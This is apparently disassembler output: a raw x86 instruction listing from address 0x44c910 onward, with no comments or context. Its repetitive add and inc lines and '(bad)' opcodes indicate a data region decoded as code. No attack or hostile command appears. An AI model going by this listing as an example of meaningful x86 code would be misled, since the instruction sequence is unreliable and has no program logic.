  44c910:	add    BYTE PTR [eax],al
  44c912:	inc    DWORD PTR [eax]
  44c914:	add    BYTE PTR [eax],al
  44c916:	inc    DWORD PTR [eax]
  44c918:	add    BYTE PTR [eax],al
  44c91a:	inc    DWORD PTR [eax]
  44c91c:	add    BYTE PTR [eax],al
  44c91e:	inc    DWORD PTR [eax]
  44c920:	add    BYTE PTR [eax],al
  44c922:	inc    DWORD PTR [eax]
  44c924:	add    BYTE PTR [eax],al
  44c926:	inc    DWORD PTR [eax]
  44c928:	add    BYTE PTR [eax],al
  44c92a:	inc    DWORD PTR [eax]
  44c92c:	add    BYTE PTR [eax],al
  44c92e:	inc    DWORD PTR [eax]
  44c930:	add    BYTE PTR [eax],al
  44c932:	inc    DWORD PTR [eax]
  44c934:	add    BYTE PTR [eax],al
  44c936:	inc    DWORD PTR [eax]
  44c938:	add    BYTE PTR [eax],al
  44c93a:	inc    DWORD PTR [eax]
  44c93c:	add    BYTE PTR [eax],al
  44c93e:	inc    DWORD PTR [eax]
  44c940:	add    BYTE PTR [eax],al
  44c942:	inc    DWORD PTR [eax]
  44c944:	add    BYTE PTR [eax],al
  44c946:	inc    DWORD PTR [eax]
  44c948:	add    BYTE PTR [eax],al
  44c94a:	inc    DWORD PTR [eax]
  44c94c:	add    BYTE PTR [eax],al
  44c94e:	inc    DWORD PTR [eax]
  44c950:	add    BYTE PTR [eax],al
  44c952:	inc    DWORD PTR [eax]
  44c954:	add    BYTE PTR [eax],al
  44c956:	inc    DWORD PTR [eax]
  44c958:	add    BYTE PTR [eax],al
  44c95a:	inc    DWORD PTR [eax]
  44c95c:	add    BYTE PTR [eax],al
  44c95e:	inc    DWORD PTR [eax]
  44c960:	add    BYTE PTR [eax],al
  44c962:	inc    DWORD PTR [eax]
  44c964:	add    BYTE PTR [eax],al
  44c966:	inc    DWORD PTR [edi]
  44c968:	push   es
  44c969:	push   es
  44c96a:	inc    BYTE PTR [ebp+0x3c]
  44c96d:	cmp    al,0x37
  44c96f:	sub    BYTE PTR [ebx],ah
  44c971:	and    edi,DWORD PTR [ecx]
  44c973:	push   es
  44c974:	add    eax,0xfc05
  44c979:	add    bh,bh
  44c97b:	add    BYTE PTR [eax],al
  44c97d:	add    bh,bh
  44c97f:	add    BYTE PTR [eax],al
  44c981:	add    bh,bh
  44c983:	add    BYTE PTR [eax],al
  44c985:	add    bh,bh
  44c987:	add    BYTE PTR [eax],al
  44c989:	add    bh,bh
  44c98b:	add    BYTE PTR [eax],al
  44c98d:	add    bh,bh
  44c98f:	add    BYTE PTR [eax],al
  44c991:	add    bh,bh
  44c993:	add    BYTE PTR [eax],al
  44c995:	add    bh,bh
  44c997:	add    BYTE PTR [eax],al
  44c999:	add    bh,bh
  44c99b:	add    BYTE PTR [eax],al
  44c99d:	add    bh,bh
  44c99f:	add    BYTE PTR [eax],al
  44c9a1:	add    bh,bh
  44c9a3:	add    BYTE PTR [eax],al
  44c9a5:	add    bh,bh
  44c9a7:	add    BYTE PTR [eax],al
  44c9a9:	add    bh,bh
  44c9ab:	add    BYTE PTR [eax],al
  44c9ad:	add    bh,bh
  44c9af:	add    BYTE PTR [eax],al
  44c9b1:	add    bh,bh
  44c9b3:	add    BYTE PTR [eax],al
  44c9b5:	add    bh,bh
  44c9b7:	add    BYTE PTR [eax],al
  44c9b9:	add    bh,bh
  44c9bb:	add    BYTE PTR [eax],al
  44c9bd:	add    bh,bh
  44c9bf:	add    BYTE PTR [eax],al
  44c9c1:	add    bh,bh
  44c9c3:	add    BYTE PTR [eax],al
  44c9c5:	add    bh,bh
  44c9c7:	add    BYTE PTR [eax],al
  44c9c9:	add    bh,bh
  44c9cb:	add    BYTE PTR [eax],al
  44c9cd:	add    bh,bh
  44c9cf:	add    BYTE PTR [eax],al
  44c9d1:	add    bh,bh
  44c9d3:	add    BYTE PTR [eax],al
  44c9d5:	add    bh,bh
  44c9d7:	add    BYTE PTR [eax],al
  44c9d9:	add    bh,bh
  44c9db:	add    BYTE PTR [eax],al
  44c9dd:	add    bh,bh
  44c9df:	add    BYTE PTR [eax],al
  44c9e1:	add    bh,bh
  44c9e3:	add    BYTE PTR [eax],al
  44c9e5:	add    bh,bh
  44c9e7:	add    BYTE PTR [eax],al
  44c9e9:	add    bh,bh
  44c9eb:	add    BYTE PTR [eax],al
  44c9ed:	add    bh,bh
  44c9ef:	add    BYTE PTR [eax],al
  44c9f1:	add    bh,bh
  44c9f3:	add    BYTE PTR [eax],al
  44c9f5:	add    bh,bh
  44c9f7:	add    BYTE PTR [eax],al
  44c9f9:	add    bh,bh
  44c9fb:	add    BYTE PTR [eax],al
  44c9fd:	add    bh,bh
  44c9ff:	add    BYTE PTR [eax],al
  44ca01:	add    bh,bh
  44ca03:	add    BYTE PTR [eax],al
  44ca05:	add    bh,bh
  44ca07:	add    BYTE PTR [eax],al
  44ca09:	add    bh,bh
  44ca0b:	add    BYTE PTR [eax],al
  44ca0d:	add    bh,bh
  44ca0f:	add    BYTE PTR [eax],al
  44ca11:	add    bh,bh
  44ca13:	add    BYTE PTR [eax],al
  44ca15:	add    bh,bh
  44ca17:	add    BYTE PTR [eax],al
  44ca19:	add    bh,bh
  44ca1b:	add    BYTE PTR [eax],al
  44ca1d:	add    bh,bh
  44ca1f:	add    BYTE PTR [eax],al
  44ca21:	add    bh,bh
  44ca23:	add    BYTE PTR [eax],al
  44ca25:	add    bh,bh
  44ca27:	add    BYTE PTR [eax],al
  44ca29:	add    bh,bh
  44ca2b:	add    BYTE PTR [eax],al
  44ca2d:	add    bh,bh
  44ca2f:	add    BYTE PTR [eax],al
  44ca31:	add    bh,bh
  44ca33:	add    BYTE PTR [eax],al
  44ca35:	add    bh,bh
  44ca37:	add    BYTE PTR [eax],al
  44ca39:	add    bh,bh
  44ca3b:	add    BYTE PTR [eax],al
  44ca3d:	add    bh,bh
  44ca3f:	add    BYTE PTR [eax],al
  44ca41:	add    bh,bh
  44ca43:	add    BYTE PTR [eax],al
  44ca45:	add    bh,bh
  44ca47:	add    BYTE PTR [eax],al
  44ca49:	add    bh,bh
  44ca4b:	add    BYTE PTR [eax],al
  44ca4d:	add    bh,bh
  44ca4f:	add    BYTE PTR [eax],al
  44ca51:	add    bh,bh
  44ca53:	add    BYTE PTR [eax],al
  44ca55:	add    bh,bh
  44ca57:	add    BYTE PTR [eax],al
  44ca59:	add    bh,bh
  44ca5b:	add    BYTE PTR [eax],al
  44ca5d:	add    bh,bh
  44ca5f:	add    BYTE PTR [eax],al
  44ca61:	add    bh,bh
  44ca63:	add    BYTE PTR [eax],al
  44ca65:	add    bh,bh
  44ca67:	sub    eax,0xbf802929
  44ca6c:	stos   BYTE PTR es:[edi],al
  44ca6d:	stos   BYTE PTR es:[edi],al
  44ca6e:	or     al,0xcc
  44ca70:	ret    
  44ca71:	ret    
  44ca72:	push   ds
  44ca73:	cmp    DWORD PTR [esp+esi*1],esi
  44ca76:	xor    DWORD PTR [eax],edx
  44ca78:	(bad)  
  44ca79:	(bad)  
  44ca7b:	add    BYTE PTR [eax],al
  44ca7d:	add    bh,bh
  44ca7f:	add    BYTE PTR [eax],al
  44ca81:	add    bh,bh
  44ca83:	add    BYTE PTR [eax],al
  44ca85:	add    bh,bh
  44ca87:	add    BYTE PTR [eax],al
  44ca89:	add    bh,bh
  44ca8b:	add    BYTE PTR [eax],al
  44ca8d:	add    bh,bh
  44ca8f:	add    BYTE PTR [eax],al
  44ca91:	add    bh,bh
  44ca93:	add    BYTE PTR [eax],al
  44ca95:	add    bh,bh
  44ca97:	add    BYTE PTR [eax],al
  44ca99:	add    bh,bh
  44ca9b:	add    BYTE PTR [eax],al
  44ca9d:	add    bh,bh
  44ca9f:	add    BYTE PTR [eax],al
  44caa1:	add    bh,bh
  44caa3:	add    BYTE PTR [eax],al
  44caa5:	add    bh,bh
  44caa7:	add    BYTE PTR [eax],al
  44caa9:	add    bh,bh
  44caab:	add    BYTE PTR [eax],al
  44caad:	add    bh,bh
  44caaf:	add    BYTE PTR [eax],al
  44cab1:	add    bh,bh
  44cab3:	add    BYTE PTR [eax],al
  44cab5:	add    bh,bh
  44cab7:	add    BYTE PTR [eax],al
  44cab9:	add    bh,bh
  44cabb:	add    BYTE PTR [eax],al
  44cabd:	add    bh,bh
  44cabf:	add    BYTE PTR [eax],al
  44cac1:	add    bh,bh
  44cac3:	add    BYTE PTR [eax],al
  44cac5:	add    bh,bh
  44cac7:	add    BYTE PTR [eax],al
  44cac9:	add    bh,bh
  44cacb:	add    BYTE PTR [eax],al
  44cacd:	add    bh,bh
  44cacf:	add    BYTE PTR [eax],al
  44cad1:	add    bh,bh
  44cad3:	add    BYTE PTR [eax],al
  44cad5:	add    bh,bh
  44cad7:	add    BYTE PTR [eax],al
  44cad9:	add    bh,bh
  44cadb:	add    BYTE PTR [eax],al
  44cadd:	add    bh,bh
  44cadf:	add    BYTE PTR [eax],al
  44cae1:	add    bh,bh
  44cae3:	add    BYTE PTR [eax],al
  44cae5:	add    bh,bh
  44cae7:	add    BYTE PTR [eax],al
  44cae9:	add    bh,bh
  44caeb:	add    BYTE PTR [eax],al
  44caed:	add    bh,bh
  44caef:	add    BYTE PTR [eax],al
  44caf1:	add    bh,bh
  44caf3:	add    BYTE PTR [eax],al
  44caf5:	add    bh,bh
  44caf7:	add    BYTE PTR [eax],al
  44caf9:	add    bh,bh
  44cafb:	add    BYTE PTR [eax],al
  44cafd:	add    bh,bh
  44caff:	add    BYTE PTR [eax],al
  44cb01:	add    bh,bh
  44cb03:	add    BYTE PTR [eax],al
  44cb05:	add    bh,bh
  44cb07:	add    BYTE PTR [eax],al
  44cb09:	add    bh,bh
  44cb0b:	add    BYTE PTR [eax],al
  44cb0d:	add    bh,bh
  44cb0f:	add    BYTE PTR [eax],al
  44cb11:	add    bh,bh
  44cb13:	add    BYTE PTR [eax],al
  44cb15:	add    bh,bh
  44cb17:	add    BYTE PTR [eax],al
  44cb19:	add    bh,bh
  44cb1b:	add    BYTE PTR [eax],al
  44cb1d:	add    bh,bh
  44cb1f:	add    BYTE PTR [eax],al
  44cb21:	add    bh,bh
  44cb23:	add    BYTE PTR [eax],al
  44cb25:	add    bh,bh
  44cb27:	add    BYTE PTR [eax],al
  44cb29:	add    bh,bh
  44cb2b:	add    BYTE PTR [eax],al
  44cb2d:	add    bh,bh
  44cb2f:	add    BYTE PTR [eax],al
  44cb31:	add    bh,bh
  44cb33:	add    BYTE PTR [eax],al
  44cb35:	add    bh,bh
  44cb37:	add    BYTE PTR [eax],al
  44cb39:	add    bh,bh
  44cb3b:	add    BYTE PTR [eax],al
  44cb3d:	add    bh,bh
  44cb3f:	add    BYTE PTR [eax],al
  44cb41:	add    bh,bh
  44cb43:	add    BYTE PTR [eax],al
  44cb45:	add    bh,bh
  44cb47:	add    BYTE PTR [eax],al
  44cb49:	add    bh,bh
  44cb4b:	add    BYTE PTR [eax],al
  44cb4d:	add    bh,bh
  44cb4f:	add    BYTE PTR [eax],al
  44cb51:	add    bh,bh
  44cb53:	add    BYTE PTR [eax],al
  44cb55:	add    bh,bh
  44cb57:	add    BYTE PTR [eax],al
  44cb59:	add    bh,bh
  44cb5b:	add    BYTE PTR [eax],al
  44cb5d:	add    bh,bh
  44cb5f:	femms  
  44cb61:	push   cs
  44cb62:	hlt    
  44cb63:	cmp    BYTE PTR ds:0xb4c35b35,dh
  44cb69:	mov    ah,0x11
  44cb6b:	mov    ebx,0x1eaaaa
	...
  44cd6c:	add    BYTE PTR [eax],al
  44cd6e:	add    BYTE PTR [eax],ch
  44cd70:	add    BYTE PTR [eax],al
  44cd72:	add    BYTE PTR [eax],dh
  44cd74:	add    BYTE PTR [eax],al
  44cd76:	add    BYTE PTR [eax+0x0],ah
  44cd79:	add    BYTE PTR [eax],al
  44cd7b:	add    DWORD PTR [eax],eax
  44cd7d:	and    BYTE PTR [eax],al
  44cd7f:	add    BYTE PTR [eax],al
  44cd81:	add    BYTE PTR [eax],al
  44cd83:	and    BYTE PTR ds:0x0,0x0
	...
  44cd96:	add    BYTE PTR [eax],al
  44cd98:	add    BYTE PTR [esi],cl
  44cd9a:	and    eax,DWORD PTR [eax]
  44cd9c:	add    BYTE PTR [edx],ah
  44cd9e:	xchg   BYTE PTR [eax],al
  44cda0:	add    BYTE PTR [ecx],ah
  44cda2:	icebp  
  44cda3:	add    BYTE PTR [eax],al
  44cda5:	and    edi,ebp
  44cda7:	add    BYTE PTR [eax],al
  44cda9:	and    edi,edi
  44cdab:	add    BYTE PTR [eax],al
  44cdad:	and    edi,edi
  44cdaf:	add    BYTE PTR [eax],al
  44cdb1:	inc    DWORD PTR cs:[eax]
  44cdb4:	add    BYTE PTR [edi],ch
  44cdb6:	inc    DWORD PTR [eax]
  44cdb8:	add    BYTE PTR ds:0x300000ff,ch
  44cdbe:	inc    DWORD PTR [eax]
  44cdc0:	add    BYTE PTR [esi],dh
  44cdc2:	inc    DWORD PTR [eax]
  44cdc4:	add    BYTE PTR [edi+edi*8],dh
  44cdc7:	add    BYTE PTR [eax],al
  44cdc9:	das    
  44cdca:	inc    DWORD PTR [eax]
  44cdcc:	add    BYTE PTR [ecx],bh
  44cdce:	inc    DWORD PTR [eax]
  44cdd0:	add    BYTE PTR [esi],dh
  44cdd2:	inc    DWORD PTR [eax]
  44cdd4:	add    BYTE PTR ds:0x3a0000ff,dh
  44cdda:	inc    DWORD PTR [eax]
  44cddc:	add    BYTE PTR [edx],bh
  44cdde:	inc    DWORD PTR [eax]
  44cde0:	add    BYTE PTR [edx],bh
  44cde2:	inc    DWORD PTR [eax]
  44cde4:	add    BYTE PTR [edi+edi*8],bh
  44cde7:	add    BYTE PTR [eax],al
  44cde9:	cmp    eax,0x3e0000ff
  44cdee:	inc    DWORD PTR [eax]
  44cdf0:	add    BYTE PTR [edi+edi*8+0x0],al
  44cdf4:	add    BYTE PTR [esi],bh
  44cdf6:	inc    DWORD PTR [eax]
  44cdf8:	add    BYTE PTR [eax-0x1],al
  44cdfb:	add    BYTE PTR [eax],al
  44cdfd:	inc    ebx
  44cdfe:	inc    DWORD PTR [eax]
  44ce00:	add    BYTE PTR [edi+edi*8+0x0],al
  44ce04:	add    BYTE PTR [ebp-0x1],cl
  44ce07:	add    BYTE PTR [eax],al
  44ce09:	aas    
  44ce0a:	inc    DWORD PTR [eax]
  44ce0c:	add    BYTE PTR [ecx],bh
  44ce0e:	inc    DWORD PTR [eax]
  44ce10:	add    BYTE PTR [esi],bh
  44ce12:	inc    DWORD PTR [eax]
  44ce14:	add    BYTE PTR [edi+edi*8],bh
  44ce17:	add    BYTE PTR [eax],al
  44ce19:	aas    
  44ce1a:	inc    DWORD PTR [eax]
  44ce1c:	add    BYTE PTR [eax-0x1],al
  44ce1f:	add    BYTE PTR [eax],al
  44ce21:	aaa    
  44ce22:	inc    DWORD PTR [eax]
  44ce24:	add    BYTE PTR [eax],bh
  44ce26:	inc    DWORD PTR [eax]
  44ce28:	add    BYTE PTR ds:0x300000ff,dh
  44ce2e:	inc    DWORD PTR [eax]
  44ce30:	add    BYTE PTR [edx],dh
  44ce32:	inc    DWORD PTR [eax]
  44ce34:	add    BYTE PTR [ebx],dh
  44ce36:	inc    DWORD PTR [eax]
  44ce38:	add    BYTE PTR [eax],bh
  44ce3a:	inc    DWORD PTR [eax]
  44ce3c:	add    BYTE PTR [edx],bh
  44ce3e:	inc    DWORD PTR [eax]
  44ce40:	add    BYTE PTR [ebx],bh
  44ce42:	inc    DWORD PTR [eax]
  44ce44:	add    BYTE PTR [eax],bh
  44ce46:	inc    DWORD PTR [esi]
  44ce48:	push   es
  44ce49:	cmp    eax,0x230000fd
  44ce4e:	out    dx,al
  44ce4f:	add    BYTE PTR [eax],al
  44ce51:	and    esi,DWORD PTR [edx+0x0]
  44ce54:	add    BYTE PTR [eax],al
  44ce56:	and    eax,DWORD PTR [eax]
  44ce58:	add    BYTE PTR [eax],dl
  44ce5a:	popf   
  44ce5b:	add    BYTE PTR [eax],al
  44ce5d:	and    edi,edi
  44ce5f:	add    BYTE PTR [eax],al
  44ce61:	sub    bh,bh
  44ce63:	add    BYTE PTR [eax],al
  44ce65:	daa    
  44ce66:	inc    DWORD PTR [eax]
  44ce68:	add    BYTE PTR [esi],ah
  44ce6a:	inc    DWORD PTR [eax]
  44ce6c:	add    BYTE PTR [edx],ch
  44ce6e:	inc    DWORD PTR [eax]
  44ce70:	add    BYTE PTR [eax],dh
  44ce72:	inc    DWORD PTR [eax]
  44ce74:	add    BYTE PTR ds:0x370000ff,dh
  44ce7a:	inc    DWORD PTR [eax]
  44ce7c:	add    BYTE PTR [edi],bh
  44ce7e:	inc    DWORD PTR [eax]
  44ce80:	add    BYTE PTR ds:0x380000ff,bh
  44ce86:	inc    DWORD PTR [eax]
  44ce88:	add    BYTE PTR [eax],bh
  44ce8a:	inc    DWORD PTR [eax]
  44ce8c:	add    BYTE PTR [ebx],bh
  44ce8e:	inc    DWORD PTR [eax]
  44ce90:	add    BYTE PTR [edi],bh
  44ce92:	inc    DWORD PTR [eax]
  44ce94:	add    BYTE PTR [edi+edi*8],bh
  44ce97:	add    BYTE PTR [eax],al
  44ce99:	inc    esi
  44ce9a:	inc    DWORD PTR [eax]
  44ce9c:	add    BYTE PTR [edi-0x1],al
  44ce9f:	add    BYTE PTR [eax],al
  44cea1:	cmp    al,0xff
  44cea3:	add    BYTE PTR [eax],al
  44cea5:	aas    
  44cea6:	inc    DWORD PTR [eax]
  44cea8:	add    BYTE PTR [ecx-0x1],al
  44ceab:	add    BYTE PTR [eax],al
  44cead:	aas    
  44ceae:	inc    DWORD PTR [eax]
  44ceb0:	add    BYTE PTR [ecx-0x1],al
  44ceb3:	add    BYTE PTR [eax],al
  44ceb5:	inc    ebx
  44ceb6:	inc    DWORD PTR [eax]
  44ceb8:	add    BYTE PTR [edi+edi*8+0x0],al
  44cebc:	add    BYTE PTR [eax-0x1],al
  44cebf:	add    BYTE PTR [eax],al
  44cec1:	cmp    al,0xff
  44cec3:	add    BYTE PTR [eax],al
  44cec5:	dec    edi
  44cec6:	inc    DWORD PTR [eax]
  44cec8:	add    BYTE PTR [esi-0x1],dl
  44cecb:	add    BYTE PTR [eax],al
  44cecd:	dec    esp
  44cece:	inc    DWORD PTR [eax]
  44ced0:	add    BYTE PTR [ebx-0x1],al
  44ced3:	add    BYTE PTR [eax],al
  44ced5:	aas    
  44ced6:	inc    DWORD PTR [eax]
  44ced8:	add    BYTE PTR [edi+edi*8],bh
  44cedb:	add    BYTE PTR [eax],al
  44cedd:	inc    ebp
  44cede:	inc    DWORD PTR [eax]
  44cee0:	add    BYTE PTR [edi+edi*8],bh
  44cee3:	add    BYTE PTR [eax],al
  44cee5:	inc    DWORD PTR ss:[eax]
  44cee8:	add    BYTE PTR [edi],dh
  44ceea:	inc    DWORD PTR [eax]
  44ceec:	add    BYTE PTR [eax],bh
  44ceee:	inc    DWORD PTR [eax]
  44cef0:	add    BYTE PTR ds:0x3a0000ff,dh
  44cef6:	inc    DWORD PTR [eax]
  44cef8:	add    BYTE PTR [edx],bh
  44cefa:	inc    DWORD PTR [eax]
  44cefc:	add    BYTE PTR [edi+edi*8],bh
  44ceff:	add    BYTE PTR [eax],al
  44cf01:	inc    DWORD PTR ds:[eax]
  44cf04:	add    BYTE PTR [eax],bh
  44cf06:	inc    DWORD PTR [eax]
  44cf08:	add    BYTE PTR ds:0x3a0000ff,bh
  44cf0e:	inc    DWORD PTR [ebx]
  44cf10:	add    ebp,DWORD PTR [edi]
  44cf12:	inc    DWORD PTR [eax]
  44cf14:	add    BYTE PTR [eax],al
  44cf16:	add    DWORD PTR [eax],0x0
  44cf19:	adc    bh,dl
  44cf1b:	add    BYTE PTR [eax],al
  44cf1d:	and    edi,edi
  44cf1f:	add    BYTE PTR [eax],al
  44cf21:	sub    edi,edi
  44cf23:	add    BYTE PTR [eax],al
  44cf25:	sub    bh,bh
  44cf27:	add    BYTE PTR [eax],al
  44cf29:	sub    bh,bh
  44cf2b:	add    BYTE PTR [eax],al
  44cf2d:	daa    
  44cf2e:	inc    DWORD PTR [eax]
  44cf30:	add    BYTE PTR [ecx],ch
  44cf32:	inc    DWORD PTR [eax]
  44cf34:	add    BYTE PTR [esi],ch
  44cf36:	inc    DWORD PTR [eax]
  44cf38:	add    BYTE PTR [edx],dh
  44cf3a:	inc    DWORD PTR [eax]
  44cf3c:	add    BYTE PTR [edi+edi*8+0x0],al
  44cf40:	add    BYTE PTR [edi],bh
  44cf42:	inc    DWORD PTR [eax]
  44cf44:	add    BYTE PTR [edi],dh
  44cf46:	inc    DWORD PTR [eax]
  44cf48:	add    BYTE PTR ds:0x3e0000ff,bh
  44cf4e:	inc    DWORD PTR [eax]
  44cf50:	add    BYTE PTR [ebx-0x1],al
  44cf53:	add    BYTE PTR [eax],al
  44cf55:	inc    edi
  44cf56:	inc    DWORD PTR [eax]
  44cf58:	add    BYTE PTR [eax-0x1],cl
  44cf5b:	add    BYTE PTR [eax],al
  44cf5d:	aas    
  44cf5e:	inc    DWORD PTR [eax]
  44cf60:	add    BYTE PTR [ecx],bh
  44cf62:	inc    DWORD PTR [eax]
  44cf64:	add    BYTE PTR [ecx-0x1],al
  44cf67:	add    BYTE PTR [eax],al
  44cf69:	aas    
  44cf6a:	inc    DWORD PTR [eax]
  44cf6c:	add    BYTE PTR [edi-0x1],al
  44cf6f:	add    BYTE PTR [eax],al
  44cf71:	aas    
  44cf72:	inc    DWORD PTR [eax]
  44cf74:	add    BYTE PTR [edx-0x1],al
  44cf77:	add    BYTE PTR [eax],al
  44cf79:	inc    ebx
  44cf7a:	inc    DWORD PTR [eax]
  44cf7c:	add    BYTE PTR [edi+edi*8+0x0],al
  44cf80:	add    BYTE PTR [eax-0x1],cl
  44cf83:	add    BYTE PTR [eax],al
  44cf85:	push   eax
  44cf86:	inc    DWORD PTR [eax]
  44cf88:	add    BYTE PTR [eax-0x1],dl
  44cf8b:	add    BYTE PTR [eax],al
  44cf8d:	dec    ebp
  44cf8e:	inc    DWORD PTR [eax]
  44cf90:	add    BYTE PTR [edx-0x1],cl
  44cf93:	add    BYTE PTR [eax],al
  44cf95:	inc    ebx
  44cf96:	inc    DWORD PTR [eax]
  44cf98:	add    BYTE PTR [esi],bh
  44cf9a:	inc    DWORD PTR [eax]
  44cf9c:	add    BYTE PTR [ebx-0x1],al
  44cf9f:	add    BYTE PTR [eax],al
  44cfa1:	inc    ecx
  44cfa2:	inc    DWORD PTR [eax]
  44cfa4:	add    BYTE PTR [edi],bh
  44cfa6:	inc    DWORD PTR [eax]
  44cfa8:	add    BYTE PTR [edi],bh
  44cfaa:	inc    DWORD PTR [eax]
  44cfac:	add    BYTE PTR [esi],bh
  44cfae:	inc    DWORD PTR [eax]
  44cfb0:	add    BYTE PTR [esi],bh
  44cfb2:	inc    DWORD PTR [eax]
  44cfb4:	add    BYTE PTR [edi+edi*8],bh
  44cfb7:	add    BYTE PTR [eax],al
  44cfb9:	cmp    bh,bh
  44cfbb:	add    BYTE PTR [eax],al
  44cfbd:	cmp    bh,bh
  44cfbf:	add    BYTE PTR [eax],al
  44cfc1:	cmp    edi,edi
  44cfc3:	add    BYTE PTR [eax],al
  44cfc5:	cmp    edi,edi
  44cfc7:	add    BYTE PTR [eax],al
  44cfc9:	inc    DWORD PTR ss:[eax]
  44cfcc:	add    BYTE PTR [edx],bh
  44cfce:	inc    DWORD PTR [eax]
  44cfd0:	add    BYTE PTR ds:0x230000ff,dh
  44cfd6:	test   BYTE PTR [eax],0x0
  44cfd9:	and    bh,bh
  44cfdb:	add    BYTE PTR [eax],al
  44cfdd:	sub    bh,bh
  44cfdf:	add    BYTE PTR [eax],al
  44cfe1:	sub    al,0xff
  44cfe3:	add    BYTE PTR [eax],al
  44cfe5:	xor    bh,bh
  44cfe7:	add    BYTE PTR [eax],al
  44cfe9:	xor    bh,bh
  44cfeb:	add    BYTE PTR [eax],al
  44cfed:	sub    eax,0x2e0000ff
  44cff2:	inc    DWORD PTR [eax]
  44cff4:	add    BYTE PTR [ecx],dh
  44cff6:	inc    DWORD PTR [eax]
  44cff8:	add    BYTE PTR [edi],ch
  44cffa:	inc    DWORD PTR [eax]
  44cffc:	add    BYTE PTR [ecx],dh
  44cffe:	inc    DWORD PTR [eax]
  44d000:	add    BYTE PTR [esi],dh
  44d002:	inc    DWORD PTR [eax]
  44d004:	add    BYTE PTR [esi],dh
  44d006:	inc    DWORD PTR [eax]
  44d008:	add    BYTE PTR [esi],dh
  44d00a:	inc    DWORD PTR [eax]
  44d00c:	add    BYTE PTR [esi],dh
  44d00e:	inc    DWORD PTR [eax]
  44d010:	add    BYTE PTR [ecx],bh
  44d012:	inc    DWORD PTR [eax]
  44d014:	add    BYTE PTR [edx],bh
  44d016:	inc    DWORD PTR [eax]
  44d018:	add    BYTE PTR [edi],bh
  44d01a:	inc    DWORD PTR [eax]
  44d01c:	add    BYTE PTR [edx-0x1],al
  44d01f:	add    BYTE PTR [eax],al
  44d021:	inc    DWORD PTR ds:[eax]
  44d024:	add    BYTE PTR [edx-0x1],al
  44d027:	add    BYTE PTR [eax],al
  44d029:	inc    esp
  44d02a:	inc    DWORD PTR [eax]
  44d02c:	add    BYTE PTR [eax-0x1],cl
  44d02f:	add    BYTE PTR [eax],al
  44d031:	inc    esi
  44d032:	inc    DWORD PTR [eax]
  44d034:	add    BYTE PTR [ebx-0x1],cl
  44d037:	add    BYTE PTR [eax],al
  44d039:	dec    edx
  44d03a:	inc    DWORD PTR [eax]
  44d03c:	add    BYTE PTR [edi-0x1],al
  44d03f:	add    BYTE PTR [eax],al
  44d041:	dec    esp
  44d042:	inc    DWORD PTR [eax]
  44d044:	add    BYTE PTR [edx-0x1],dl
  44d047:	add    BYTE PTR [eax],al
  44d049:	dec    esp
  44d04a:	inc    DWORD PTR [eax]
  44d04c:	add    BYTE PTR [edx-0x1],al
  44d04f:	add    BYTE PTR [eax],al
  44d051:	inc    DWORD PTR ds:[eax]
  44d054:	add    BYTE PTR [edi-0x1],al
  44d057:	add    BYTE PTR [eax],al
  44d059:	inc    esi
  44d05a:	inc    DWORD PTR [eax]
  44d05c:	add    BYTE PTR [ecx-0x1],al
  44d05f:	add    BYTE PTR [eax],al
  44d061:	inc    eax
  44d062:	inc    DWORD PTR [eax]
  44d064:	add    BYTE PTR [edi],bh
  44d066:	inc    DWORD PTR [eax]
  44d068:	add    BYTE PTR ds:0x3d0000ff,bh
  44d06e:	inc    DWORD PTR [eax]
  44d070:	add    BYTE PTR [esi],bh
  44d072:	inc    DWORD PTR [eax]
  44d074:	add    BYTE PTR [edi+edi*8],bh
  44d077:	add    BYTE PTR [eax],al
  44d079:	cmp    bh,bh
  44d07b:	add    BYTE PTR [eax],al
  44d07d:	cmp    bh,bh
  44d07f:	add    BYTE PTR [eax],al
  44d081:	xor    al,0xff
  44d083:	add    BYTE PTR [eax],al
  44d085:	xor    al,0xff
  44d087:	add    BYTE PTR [eax],al
  44d089:	inc    DWORD PTR ss:[eax]
  44d08c:	add    BYTE PTR [esi],dh
  44d08e:	inc    DWORD PTR [eax]
  44d090:	add    BYTE PTR [edx],dh
  44d092:	inc    DWORD PTR [eax]
  44d094:	add    BYTE PTR [ebx],ah
  44d096:	inc    DWORD PTR [eax]
  44d098:	add    BYTE PTR [ecx],bl
  44d09a:	inc    DWORD PTR [eax]
  44d09c:	add    BYTE PTR [esi],ah
  44d09e:	inc    DWORD PTR [eax]
  44d0a0:	add    BYTE PTR [edi],ah
  44d0a2:	inc    DWORD PTR [eax]
  44d0a4:	add    BYTE PTR [esi],ah
  44d0a6:	inc    DWORD PTR [eax]
  44d0a8:	add    BYTE PTR [eax],ch
  44d0aa:	inc    DWORD PTR [eax]
  44d0ac:	add    BYTE PTR [edi],ch
  44d0ae:	inc    DWORD PTR [eax]
  44d0b0:	add    BYTE PTR [edx],dh
  44d0b2:	inc    DWORD PTR [eax]
  44d0b4:	add    BYTE PTR ds:0x360000ff,dh
  44d0ba:	inc    DWORD PTR [eax]
  44d0bc:	add    BYTE PTR ds:0x380000ff,dh
  44d0c2:	inc    DWORD PTR [eax]
  44d0c4:	add    BYTE PTR [edi+edi*8],dh
  44d0c7:	add    BYTE PTR [eax],al
  44d0c9:	xor    al,0xff
  44d0cb:	add    BYTE PTR [eax],al
  44d0cd:	inc    DWORD PTR ss:[eax]
  44d0d0:	add    BYTE PTR [edi],dh
  44d0d2:	inc    DWORD PTR [eax]
  44d0d4:	add    BYTE PTR ds:0x370000ff,dh
  44d0da:	inc    DWORD PTR [eax]
  44d0dc:	add    BYTE PTR [edx-0x1],al
  44d0df:	add    BYTE PTR [eax],al
  44d0e1:	inc    DWORD PTR ds:[eax]
  44d0e4:	add    BYTE PTR [ecx],bh
  44d0e6:	inc    DWORD PTR [eax]
  44d0e8:	add    BYTE PTR ds:0x420000ff,bh
  44d0ee:	inc    DWORD PTR [eax]
  44d0f0:	add    BYTE PTR [edx-0x1],cl
  44d0f3:	add    BYTE PTR [eax],al
  44d0f5:	dec    eax
  44d0f6:	inc    DWORD PTR [eax]
  44d0f8:	add    BYTE PTR [edx-0x1],cl
  44d0fb:	add    BYTE PTR [eax],al
  44d0fd:	dec    ebp
  44d0fe:	inc    DWORD PTR [eax]
  44d100:	add    BYTE PTR [edi-0x1],cl
  44d103:	add    BYTE PTR [eax],al
  44d105:	push   eax
  44d106:	inc    DWORD PTR [eax]
  44d108:	add    BYTE PTR [esi-0x1],cl
  44d10b:	add    BYTE PTR [eax],al
  44d10d:	inc    esp
  44d10e:	inc    DWORD PTR [eax]
  44d110:	add    BYTE PTR ds:0x450000ff,bh
  44d116:	inc    DWORD PTR [eax]
  44d118:	add    BYTE PTR [edi],bh
